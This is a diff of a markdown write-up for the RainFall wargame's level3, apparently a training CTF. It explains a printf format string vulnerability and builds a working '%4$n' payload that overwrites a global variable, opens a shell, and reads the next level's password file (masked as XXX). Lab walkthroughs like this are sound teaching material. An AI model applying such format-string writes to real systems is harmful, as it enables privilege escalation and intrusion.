@@ -40,7 +40,6 @@ Non-debugging symbols:
 [...]
 ```
 
-
 Using the gdb command `info functions`, we can list all functions present in the binary.
 Here, we find 2 interesting functions: `main` and `v`.
 
@@ -53,85 +52,128 @@ The `main` function calls `v()` then return.
 
 ### v function 
 
-The `v` function first calls `fgets()` on `stdout` to store the input in a local variable `level_20c` with a size limit of `0x200` (i.e 512 in hexadecimal).
+The `v` function first calls `fgets()` on `stdout` to store the input in a **local variable** `level_20c` with a **size limit** of `0x200` (i.e 512 in hexadecimal).
 
 Then it's check if a unknow variable (probably gobal) `m` is equal to `0x40` (i.e 64 in hexadecimal). If the condition is `true`, the program prints `Wait what?!\n` and call `system("/bin/sh")`.
 
 Then returns.
 
-
 ## 3. Exploit Development
 
-Here we cannot execute a overflow on the stack from the input, because of the `fgets()` that secure this sort of attack with a limited size.
+In this level, we cannot perform a classic stack buffer overflow via user input.
+The call to `fgets()` **limits the input size**, which **prevents overflowing** the stack buffer.
 
-Here we have to exploit `printf()`.
+Instead, the **vulnerability** comes from `printf()`.
 
 ### Discover `printf` Exploit
 
-The exploit is possible because of this line :
+The **exploit** is **caused** by the following line :
 ```c
   printf(local_20c);
 ```
 
-By directly taking the variable in argument (instead of the usual in `printf("%s", local_20c);`), it is possible to put some "printf instruction".
-For example : `%x` that prints and pops the first element in the stack.
+Here, user-controlled input is passed **directly** as the **format string**.
+Instead of using a **safe call** such as: `printf("%s", local_20c);`. the program allows us to **inject format specifiers**.
+
+For example, `%x` prints values from the stack by popping them one by one.
+This behavior allows us to read and write arbitrary values in memory.
+
+This attack is known as a **Format String Attack**.
 
 ---
 
 ### Exploit Principle
 
-Here the exploit structure:
+The goal is to modify the global variable `m` so that its value becomes `0x40`, which triggers the call to `system("/bin/sh")`.
+
+Here is the following attack structure:
 ```
-<memory address to update>	<buffer>	<%X\$n> (X being the place in the stack of the memory to affect)
-						  |	total being value of the update	|
+<memory address to update>	<padding>	<%X$n>
 ```
 
-### Investigate
+Where:
+  - `<memory address to update>` is the **address** of the **target variable** (`m`).
+  - `<padding>` represents the **number of characters** to print.
+  - `<%X$n>` **writes** the number of printed characters to the **memory address** located at position `X` on the **stack**.
 
-First we are gonna use the `%x` to found where in the stack is our input:
+The total **number of printed characters** (i.e `<memory address to update>` + `<padding>`) determines the **value written** to the target address.
+
+`%X$n` is a **positional format specifier** that allows writing to memory.
+
+Structure:
+- `%`  : begins the **format directive**.
+- `X$` : indicates which **stack argument** (represented by `X`) is used as the **destination address**.
+- `n`  : **writes** the number of characters printed so far **into that address**.
+
+---
+
+### Get Exploit Values
+
+First, we use `%x` to **find the position** of our **input** on the **stack**:
+
 ```bash
 level3@RainFall:~$ python -c "print 'aaaa' + '%x %x %x %x %x %x' " | ./level3 
 aaaa200 b7fd1ac0 b7ff37d0 61616161 25207825 78252078
 ```
 
-`aaaa` in hexadecimal `61616161`, can be found at the 4th place.
+`aaaa` corresponding to `61616161` in hexadecimal appears at the **4th position** on the stack.
+This position will be used in the last part of the format string: `<%X$n>`.
 
-Secondary, we need to found 
+---
 
+Next, we need the address of the **target variable**.
 
+From the assembly dump, we can find the `if` statement:
 
 ```s
    0x080484da <+54>:	mov    0x804988c,%eax
    0x080484df <+59>:	cmp    $0x40,%eax
 ```
 
-## 3.
+The **target address** is therefore : `0x804988c`. In little-endian format:
+```
+\x8c\x98\x04\x08
+```
+
+---
+
+Finally, we need to implement the **value to write**. Here, the target value is `0x40` (64 in decimal), structured as follows:
 
 ```
+<memory address to update>  +   <padding>	
+              4             +       60      = 64
 ```
+
+The padding ensures that exactly **64 characters** are printed before the `%n` **writes** this value **into the target address**.
+
+---
+
+### Create the Payload
+
+```
+python -c "print '\x8c\x98\x04\x08' + 'a' * 60  + '%4\$n' " > /tmp/p3
+```
+
+Note:
+- The backslash (`\`) in the last element is used to escape the `$` character.
+
 
 **Explanation:**
-- ``				: blablabla.
-- `` 				: blablabla.
-- `` 				: blablabla.
+- `python`			: launches the Python interpreter.
+- `-c` 					: executes the command passed as a string.
+- `print` 			: outputs data to standard output.
 
-## 4.
 
-```
-```
-
-**Explanation:**
-- ``				: blablabla.
-- `` 				: blablabla.
-- `` 				: blablabla.
 
 ## 4. Get The Flag
 
 ```bash
-> su flagXX
-Password: 
-Don't forget to launch getflag !
-
-> getflag
-Check flag.Here is your token : XXX
+level3@RainFall:~$ python -c "print '\x8c\x98\x04\x08' + 'a' * 60  + '%4\$n' " > /tmp/p3
+level3@RainFall:~$ cat /tmp/p3 - | ./level3 
+�aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+Wait what?!
+id
+uid=2022(level3) gid=2022(level3) euid=2025(level4) egid=100(users) groups=2025(level4),100(users),2022(level3)
+cat /home/user/level4/.pass            
+XXX
 ```
